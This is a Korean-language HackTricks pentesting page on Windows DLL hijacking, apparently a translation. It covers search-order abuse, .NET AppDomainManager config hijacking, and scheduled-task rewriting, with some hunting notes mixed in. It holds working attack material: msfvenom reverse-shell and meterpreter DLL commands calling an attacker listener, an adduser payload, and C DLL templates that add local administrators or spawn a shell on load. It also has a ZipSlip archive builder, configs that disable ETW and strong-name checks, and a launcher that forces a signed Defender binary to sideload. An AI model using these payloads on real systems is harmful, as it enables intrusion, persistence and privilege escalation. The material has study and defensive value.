# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 기본 정보

DLL Hijacking은 신뢰할 수 있는 애플리케이션이 악성 DLL을 로드하도록 조작하는 기법입니다. 이 용어에는 **DLL Spoofing, Injection, Side-Loading**과 같은 여러 전술이 포함됩니다. 주로 code execution과 persistence 달성에 사용되며, privilege escalation에는 비교적 드물게 사용됩니다. 여기서는 escalation에 중점을 두지만, hijacking 방법 자체는 목적과 관계없이 동일합니다.

### 일반적인 기법

DLL hijacking에는 여러 방법이 사용되며, 각 방법의 효과는 애플리케이션의 DLL 로딩 전략에 따라 달라집니다:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: 정품 DLL을 악성 DLL로 교체하며, 필요에 따라 DLL Proxying을 사용해 원본 DLL의 기능을 유지합니다.
2. **DLL Search Order Hijacking**: 애플리케이션의 검색 패턴을 악용해 정식 DLL보다 앞선 검색 경로에 악성 DLL을 배치합니다.
3. **Phantom DLL Hijacking**: 애플리케이션이 존재하지 않는 필수 DLL이라고 생각하는 악성 DLL을 생성해 로드하도록 합니다.
4. **DLL Redirection**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 파일과 같은 검색 매개변수를 수정해 애플리케이션이 악성 DLL을 가리키도록 합니다.
5. **WinSxS DLL Replacement**: WinSxS 디렉터리의 정식 DLL을 악성 DLL로 대체하며, 이는 DLL side-loading과 연관되는 경우가 많습니다.
6. **Relative Path DLL Hijacking**: 복사된 애플리케이션과 함께 사용자 제어 디렉터리에 악성 DLL을 배치하며, Binary Proxy Execution 기법과 유사합니다.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading만이 신뢰할 수 있는 **.NET Framework** 프로세스가 attacker code를 로드하도록 만드는 유일한 방법은 아닙니다. 대상 executable이 **managed** 애플리케이션인 경우 CLR은 executable 이름을 따서 지정된 **application configuration file**(예: `Setup.exe.config`)도 참조합니다. 이 파일은 custom **AppDomainManager**를 정의할 수 있습니다. config가 EXE 옆에 배치된 attacker-controlled assembly를 가리키면 CLR은 **application's normal code path**보다 먼저 이를 로드하고, 신뢰할 수 있는 프로세스 내부에서 실행합니다.<sup>[[24]](#references)</sup>

Microsoft의 .NET Framework configuration schema에 따르면 custom manager가 사용되려면 `<appDomainManagerAssembly>`와 `<appDomainManagerType>`이 모두 있어야 합니다.<sup>[[16]](#references)[[17]](#references)</sup>

최소 config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
최소 관리자:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
실전 참고 사항:
- 이는 **.NET Framework specific** tradecraft입니다. Win32 DLL search order가 아니라 CLR config parsing에 의존합니다.
- 호스트는 실제로 **managed EXE**여야 합니다. 빠른 triage 방법: `sigcheck -m target.exe`, `corflags target.exe`를 사용하거나 PE metadata에서 **CLR Runtime Header**를 확인합니다.
- config filename은 실행 파일 이름과 정확히 일치해야 하며(`<binary>.config`), 일반적으로 **EXE와 같은 디렉터리**에 위치합니다.
- **signed Microsoft/vendor binaries**와 함께 사용하면 유용합니다. 신뢰된 EXE는 수정하지 않은 상태로 유지하면서 악성 managed assembly가 in-process로 실행되기 때문입니다.
- 이미 쓰기 가능한 installer/update 디렉터리를 확보했다면, AppDomainManager hijacking을 **first stage**로 사용한 뒤 이후 stage에서 classic DLL sideloading 또는 reflective loading을 사용할 수 있습니다.

### downloader 및 scheduled-task bootstrap 역할을 하는 AppDomainManager

실용적인 intrusion pattern은 신뢰된 managed EXE를 악성 `*.config` 및 **small bootstrapper** 역할만 수행하는 악성 AppDomainManager DLL과 함께 사용하는 것입니다:<sup>[[25]](#references)</sup>

1. 사용자가 `%USERPROFILE%\Downloads`와 같이 신뢰할 수 있어 보이는 위치에서 signed .NET installer 또는 updater를 실행합니다.
2. 인접한 config가 정식 앱 로직이 시작되기 **전에** CLR이 attacker assembly를 로드하도록 합니다.
3. 악성 manager가 **path gate**를 수행합니다(예: host EXE가 `Downloads`에서 실행 중인 경우에만 계속 진행하고, second stage는 `%LOCALAPPDATA%`에서만 실행되도록 함).
4. 검사가 통과되면 `%LOCALAPPDATA%\PerfWatson2.exe`와 같은 user-writable path에 실제 payload를 다운로드하고 scheduled task로 persistence를 설치합니다.

이 variant가 중요한 이유:
- signed host EXE는 변경되지 않으므로 main binary의 hash만 확인하는 triage에서는 compromise를 놓칠 수 있습니다.
- 단순한 **path-based anti-analysis**가 흔히 사용됩니다. ZIP/EXE/DLL triad를 Desktop, Temp 또는 sandbox path로 옮기면 chain이 의도적으로 중단될 수 있습니다.
- first-stage AppDomainManager DLL은 작고 low-noise 상태로 유지하면서 실제 implant는 나중에 가져올 수 있습니다.

이 pattern에서 자주 확인되는 minimal persistence example:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
참고:
- ` /rl highest`는 해당 사용자/세션에서 **사용 가능한 가장 높은 권한**을 의미하며, 그 자체로 SYSTEM 권한 상승이 보장되는 것은 아닙니다.
- 이 technique은 classic missing-DLL search-order hijacking이라기보다 **.NET config abuse를 통한 execution/persistence**로 분류하는 편이 더 적절한 경우가 많지만, operators는 두 가지를 함께 사용하는 경우가 많습니다.

Detection pivots:
- **ZIP extraction paths**, `Downloads`, `%TEMP%` 또는 기타 사용자가 쓸 수 있는 폴더에서 실행되며, **같은 디렉터리에 있는** `<exe>.config`를 사용하는 signed .NET executables.
- 작업이 `%LOCALAPPDATA%`, `%APPDATA%` 또는 `Downloads`를 가리키고, 이름이 browser/vendor updaters와 유사한 새 scheduled tasks.
- 즉시 다른 EXE를 download한 다음 `schtasks.exe`를 spawn하는 짧은 수명의 managed bootstrap processes.
- executable path가 예상되는 user-profile directory와 일치하지 않으면 조기에 종료하는 samples.

### 기존 scheduled task를 hijacking하여 sideload chain 재실행

Persistence를 위해 **새 task 생성**만 확인하지 마세요. 일부 intrusion sets는 legitimate installer가 **일반적인 updater task**를 생성할 때까지 기다린 다음, 기존 이름, author 및 trigger가 defenders에게 익숙하게 유지되도록 **task action을 rewrite**합니다.

재사용 가능한 workflow:
1. legitimate software를 설치하거나 실행하고, 일반적으로 생성되는 task를 식별합니다.
2. task XML을 export하고 현재 `<Exec><Command>` / `<Arguments>` 값을 기록합니다.<sup>[[23]](#references)</sup>
3. action만 교체하여 task가 user-writable staging directory에 있는 **trusted host EXE**를 시작하도록 합니다. 그러면 해당 EXE가 실제 payload를 side-load하거나 AppDomain-load합니다.
4. 새로운 명백한 persistence artifact를 생성하는 대신 동일한 task name으로 다시 register합니다.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
더 은밀한 이유:
- 작업 이름은 여전히 정상적으로 보일 수 있습니다(예: vendor updater).
- **Task Scheduler service**가 이를 실행하므로, parent/ancestor validation에서는 `explorer.exe` 대신 예상된 scheduling chain이 표시되는 경우가 많습니다.
- **새 task name**만 검색하는 DFIR 팀은 registration이 이미 존재하지만 action이 `%LOCALAPPDATA%`, `%APPDATA%` 또는 공격자가 제어하는 다른 경로를 가리키도록 변경된 task를 놓칠 수 있습니다.

빠른 hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML 및 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata를 baseline과 비교합니다.
- **vendor-looking updater task**가 **user-writable directories**에서 실행되거나, 나란히 있는 `*.config` 파일과 함께 .NET EXE를 실행하면 alert를 생성합니다.

> [!TIP]
> HTML staging, AES-CTR configs 및 .NET implants를 DLL sideloading 위에 결합하는 step-by-step chain은 아래 workflow를 참고하세요.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 누락된 Dll 찾기

system 내부에서 누락된 Dll을 찾는 가장 일반적인 방법은 sysinternals의 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행하고 **다음 2개의 filter를 설정하는 것**입니다:

![Common Techniques - 누락된 Dll 찾기: system 내부에서 누락된 Dll을 찾는 가장 일반적인 방법은 sysinternals의 procmon을 실행하고 다음 2개의 filter를 설정하는 것입니다](<../../../images/image (961).png>)

![Common Techniques - 누락된 Dll 찾기: system 내부에서 누락된 Dll을 찾는 가장 일반적인 방법은 sysinternals의 procmon을 실행하고 다음 2개의 filter를 설정하는 것입니다](<../../../images/image (230).png>)

그런 다음 **File System Activity**만 표시합니다:

![Common Techniques - 누락된 Dll 찾기: File System Activity만 표시합니다](<../../../images/image (153).png>)

**일반적인 누락 dll**을 찾는 경우 이를 몇 **초** 동안 실행한 상태로 **둡니다**.\
**특정 executable 내부의 누락된 DLL**을 찾는 경우 **"Process Name" "contains" `<exec name>`**와 같은 filter를 하나 더 설정하고, 이를 실행한 다음 event capture를 중지합니다.<sup>[[9]](#references)</sup>

## 누락된 Dll 악용

privilege를 escalate하려면 **privileged process가 write 가능한 location에서 load하려는 DLL**을 찾습니다. 이는 legitimate DLL이 있는 directory보다 먼저 검색되는 directory를 제어하거나, 요청된 DLL이 존재하지 않아 검색되는 directory 중 하나에 write할 수 있을 때 발생할 수 있습니다.

### Dll Search Order

**[Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)**에서 Dll이 구체적으로 어떻게 load되는지 확인할 수 있습니다.

**Windows applications**는 **사전 정의된 search paths**를 따르고 특정 sequence에 따라 DLL을 찾습니다. DLL hijacking 문제는 harmful DLL을 이러한 directory 중 하나에 전략적으로 배치하여 authentic DLL보다 먼저 load되도록 할 때 발생합니다. 이를 방지하는 방법은 application이 필요한 DLL을 참조할 때 absolute paths를 사용하도록 하는 것입니다.

아래에서 **32-bit** system의 **DLL search order**를 확인할 수 있습니다:

1. application이 load된 directory.
2. system directory. 이 directory의 path를 가져오려면 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function을 사용합니다.(_C:\Windows\System32_)
3. 16-bit system directory. 이 directory의 path를 가져오는 function은 없지만 검색됩니다. (_C:\Windows\System_)
4. Windows directory. 이 directory의 path를 가져오려면 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function을 사용합니다.
1. (_C:\Windows_)
5. current directory.
6. PATH environment variable에 나열된 directory. 여기에는 **App Paths** registry key로 지정된 per-application path가 포함되지 않는다는 점에 유의합니다. **App Paths** key는 DLL search path를 계산할 때 사용되지 않습니다.

이는 **SafeDllSearchMode**가 enabled인 경우의 **default** search order입니다. disabled인 경우 current directory가 두 번째 위치로 올라갑니다. 이 feature를 disable하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value를 생성하고 0으로 설정합니다(default는 enabled).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function이 **LOAD_WITH_ALTERED_SEARCH_PATH**와 함께 호출되면, search는 **LoadLibraryEx**가 load하는 executable module의 directory에서 시작됩니다.

마지막으로 DLL은 이름 대신 absolute path로 load될 수 있습니다. 이 경우 Windows는 DLL 자체에 대해 해당 path만 확인하지만, 이름으로 요청된 dependencies는 여전히 적용 가능한 search order를 따릅니다.

search order를 변경하는 다른 방법도 있지만 여기서는 설명하지 않겠습니다.

### 임의의 file write를 누락된-DLL hijack으로 연결하기

1. **ProcMon** filters(`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`)를 사용하여 process가 probe하지만 찾지 못하는 DLL names를 수집합니다.<sup>[[14]](#references)</sup>
2. binary가 **schedule/service**에서 실행되는 경우, 해당 names 중 하나를 사용하는 DLL을 **application directory**(search-order entry #1)에 drop하면 다음 execution 때 load됩니다. 한 .NET scanner case에서 process는 `C:\samples\app\`에서 `hostfxr.dll`을 찾은 후 `C:\Program Files\dotnet\fxr\...`의 real copy를 load하려고 했습니다.
3. 임의의 export가 있는 payload DLL(예: reverse shell)을 build합니다: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. primitive가 **ZipSlip-style arbitrary write**인 경우 extraction dir에서 벗어나 DLL이 app folder에 저장되도록 하는 ZIP을 생성합니다:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. 감시 중인 inbox/share에 archive를 전달합니다. scheduled task가 process를 다시 실행하면 malicious DLL을 로드하고 service account 권한으로 코드를 실행합니다.

### RTL_USER_PROCESS_PARAMETERS.DllPath를 통한 sideloading 강제

새로 생성된 process의 DLL search path에 결정적으로 영향을 주는 고급 방법은 ntdll의 native API로 process를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath field를 설정하는 것입니다. 여기에서 attacker가 제어하는 directory를 지정하면, 이름으로 imported DLL을 resolve하는 target process(absolute path를 사용하지 않고 safe loading flags도 사용하지 않는 경우)가 해당 directory의 malicious DLL을 로드하도록 강제할 수 있습니다.

핵심 아이디어
- RtlCreateProcessParametersEx로 process parameters를 생성하고, controlled folder(예: dropper/unpacker가 있는 directory)를 가리키는 custom DllPath를 제공합니다.
- RtlCreateUserProcess로 process를 생성합니다. target binary가 이름으로 DLL을 resolve하면 loader는 resolution 과정에서 제공된 DllPath를 참조하므로, malicious DLL이 target EXE와 같은 directory에 있지 않아도 안정적인 sideloading이 가능합니다.

참고 사항/제한 사항
- 이는 생성 중인 child process에 영향을 줍니다. current process에만 영향을 주는 SetDllDirectory와는 다릅니다.
- target은 이름으로 DLL을 import하거나 LoadLibrary해야 합니다(absolute path를 사용하지 않고 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories도 사용하지 않아야 함).
- KnownDLLs와 hardcoded absolute paths는 hijack할 수 없습니다. Forwarded exports와 SxS에 따라 우선순위가 달라질 수 있습니다.

Minimal C example (ntdll, wide strings, 단순화된 error handling):

<details>
<summary>전체 C example: RTL_USER_PROCESS_PARAMETERS.DllPath를 통한 DLL sideloading 강제</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- 악성 xmllite.dll(`필요한 함수를 export하거나 실제 DLL로 proxying`)을 DllPath 디렉터리에 배치합니다.
- 위 technique을 사용하여 이름으로 xmllite.dll을 조회하는 것으로 알려진 서명된 binary를 실행합니다. loader는 제공된 DllPath를 통해 import를 resolve하고 사용자의 DLL을 sideload합니다.

이 technique은 실제 공격에서 multi-stage sideloading chain을 구동하는 데 사용된 사례가 관찰되었습니다. 초기 launcher가 helper DLL을 drop하면, 해당 DLL이 Microsoft 서명 hijack 가능한 binary를 custom DllPath와 함께 spawn하여 staging directory에서 attacker의 DLL을 강제로 load합니다.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

**.NET Framework** target의 경우, 애플리케이션에 인접한 **`.exe.config`** 파일을 악용하면 memory를 patch하지 않고도 **`Main()`** 이전에 sideloading을 수행할 수 있습니다. Win32 DLL search order에만 의존하는 대신, attacker는 legitimate .NET EXE를 악성 config 및 하나 이상의 attacker-controlled assembly와 함께 배치합니다.

Chain의 작동 방식:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE가 시작되고 **CLR이 `<exe>.config`를 읽습니다**.
2. Config가 **`<appDomainManagerAssembly>`** 및 **`<appDomainManagerType>`**을 설정하여 runtime이 attacker-controlled `AppDomainManager`를 instantiate하도록 합니다.
3. 악성 manager가 trusted host process 내부에서 **pre-`Main()` execution**을 수행합니다.
4. 동일한 config를 사용하여 CLR이 local assembly(`InitInstall.dll`, `Updater.dll`, `uevmonitor.dll` 등)를 먼저 resolve하도록 강제할 수 있으며, inline patching 없이 runtime validation/telemetry를 약화할 수도 있습니다.

Campaign-style pattern (directive / CLR version에 따라 정확한 nesting은 달라질 수 있음):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
유용한 이유:
- **`<probing privatePath="."/>`**는 assembly resolution을 애플리케이션 디렉터리 내로 유지하여, 해당 폴더를 예측 가능한 sideloading surface로 만듭니다.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`**는 CLR initialization 중, legitimate app logic이 실행되기 전에 실행을 attacker code로 이동시킵니다.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`**는 full-trust app이 strong-name validation failure 없이 unsigned 또는 tampered assemblies를 로드하도록 할 수 있습니다.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`**는 publisher-policy redirect를 newer assemblies로 수행하지 않도록 합니다.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`**는 runtime selection을 더 deterministic하게 만듭니다.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`****가 특히 흥미로운 이유는 implant가 메모리에서 `EtwEventWrite`를 patch하는 대신, configuration을 통해 **CLR 자체의 ETW visibility를 비활성화**하기 때문입니다.

최근 campaigns에서 확인된 operational pattern:
- Stage 1에서는 `setup.exe`, `setup.exe.config` 및 local assemblies를 drop합니다.
- Stage 2에서는 이를 그럴듯한 **AppData update** 폴더로 복사하고, host 이름을 `update.exe`와 같이 변경한 다음 **scheduled task**를 통해 다시 실행합니다.
- Stage 3에서는 최종 RAT DLL/export를 로드하기 전에 execution context를 검증합니다(예: Task Scheduler에서 예상되는 parent인 `svchost.exe`).

Hunting 아이디어:
- 사용자 쓰기 가능 위치에서 의심스러운 인접 **`.config`** 파일과 함께 실행되는 signed 또는 그 밖에 legitimate한 **.NET executables**.
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** 또는 **`etwEnable enabled="false"`**를 포함하는 `.config` 파일.
- **`%LOCALAPPDATA%`** 또는 앱별 `\bin\update\` 디렉터리에서 이름이 변경된 update binaries를 다시 실행하는 scheduled tasks.
- scheduled task가 trusted .NET host를 실행하고, 해당 host가 자신의 디렉터리에서 vendor가 아닌 assemblies를 즉시 로드하는 parent/child chains.

#### Windows docs의 DLL search order 예외

Windows documentation에는 standard DLL search order에 대한 다음과 같은 예외가 명시되어 있습니다:

- **이미 메모리에 로드된 DLL과 이름이 같은 DLL**을 만나면 시스템은 일반적인 search를 우회합니다. 대신 redirection과 manifest를 확인한 후, 이미 메모리에 있는 DLL을 기본값으로 사용합니다. **이 시나리오에서는 시스템이 DLL을 검색하지 않습니다**.
- 해당 DLL이 현재 Windows version에서 **known DLL**로 인식되는 경우, 시스템은 search process를 수행하지 않고 해당 known DLL의 version과 그 dependent DLLs를 사용합니다. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**에 이러한 known DLL 목록이 저장되어 있습니다.
- **DLL에 dependencies가 있는 경우**, 해당 dependent DLLs에 대한 search는 initial DLL이 full path를 통해 식별되었는지와 관계없이, 해당 DLL들이 **module names**만으로 지정된 것처럼 수행됩니다.

### Privileges Escalating

**Requirements**:

- **DLL**이 없으며, **different privileges**(horizontal 또는 lateral movement)로 동작하거나 동작하게 될 process를 식별합니다.
- **DLL**이 **searched for**될 모든 **directory**에 대해 **write access**가 있는지 확인합니다. 이 위치는 executable의 directory이거나 system path 내의 directory일 수 있습니다.

이러한 prerequisites는 기본적으로 흔하지 않습니다. privileged executables에는 일반적으로 missing DLL dependencies가 없고, standard users는 보통 system search-path directories에 write할 수 없습니다. 그러나 misconfigured environments에서는 두 조건이 모두 노출될 수 있습니다.\
requirements가 충족되면 [UACME](https://github.com/hfiref0x/UACME) project를 확인하세요. 주요 목적은 UAC bypass이지만, 특정 Windows versions를 위한 DLL-hijacking PoCs가 포함되어 있으며, 발견한 writable directory에 맞게 조정할 수 있는 경우가 많습니다.

다음과 같이 **folder의 permissions를 확인**할 수 있습니다:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
그리고 **PATH 내부의 모든 폴더에 대한 권한도 확인하세요**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
다음과 같이 실행 파일의 imports와 DLL의 exports도 확인할 수 있습니다:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**Dll Hijacking을 악용하여 System Path 폴더에 쓰기 권한으로 권한을 상승하는 방법**에 대한 전체 가이드는 다음을 확인하세요:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 자동화 도구

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 system PATH 내부의 폴더에 쓰기 권한이 있는지 확인합니다.\
이 취약점을 발견하는 데 유용한 다른 자동화 도구로는 **PowerSploit functions**인 _Find-ProcessDLLHijack_, _Find-PathDLLHijack_, _Write-HijackDll_이 있습니다.

### 예시

악용 가능한 상황을 발견한 경우, 성공적으로 exploit하기 위해 가장 중요한 것 중 하나는 **실행 파일이 해당 DLL에서 import하는 모든 function을 최소한 export하는 dll을 생성하는 것**입니다. 어쨌든 Dll Hijacking은 [Medium Integrity level에서 High **(UAC 우회)**](../../authentication-credentials-uac-and-efs/index.html#uac)로 또는[ **High Integrity에서 SYSTEM**](../index.html#from-high-integrity-to-system)**으로 권한을 상승하는 데 유용합니다.** 실행을 위한 dll hijacking에 초점을 맞춘 이 Dll Hijacking 연구에서 **유효한 dll을 생성하는 방법**의 예시를 확인할 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한, **다음 섹션**에서는 **template**로 사용하거나 **필요하지 않은 function을 export하는 dll**을 생성하는 데 유용할 수 있는 **기본 dll code**를 확인할 수 있습니다.

## **Dll 생성 및 컴파일**

### **Dll Proxifying**

기본적으로 **Dll proxy**는 **로드될 때 악성 code를 실행**하면서도 **실제 library에 모든 call을 relay하여** **노출**하고 **예상대로 작동**할 수 있는 Dll입니다.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus)를 사용하면 proxify하려는 **library를 선택하고 실행 파일을 지정하여 proxified dll을 생성**하거나, **Dll을 지정하여 proxified dll을 생성**할 수 있습니다.

### **Meterpreter**

**rev shell 가져오기 (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) 획득:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성 (x86 버전만 확인했으며 x64 버전은 찾지 못함):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 직접 작성

대부분의 경우, 컴파일하는 DLL은 **피해자 프로세스가 import하는 모든 함수를 export해야 합니다**. 필요한 export가 누락되면 바이너리가 해당 함수를 resolve할 수 없으므로 exploit이 실패합니다.

<details>
<summary>C DLL 템플릿 (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>사용자 생성 기능이 포함된 C++ DLL 예제</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>thread entry를 사용하는 대체 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe는 시작할 때 예측 가능한 언어별 localization DLL을 계속 검색하므로, 이를 hijack하여 임의의 code execution 및 persistence에 악용할 수 있습니다.<sup>[[7]](#references)</sup>

주요 사실
- Probe path (현재 빌드): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
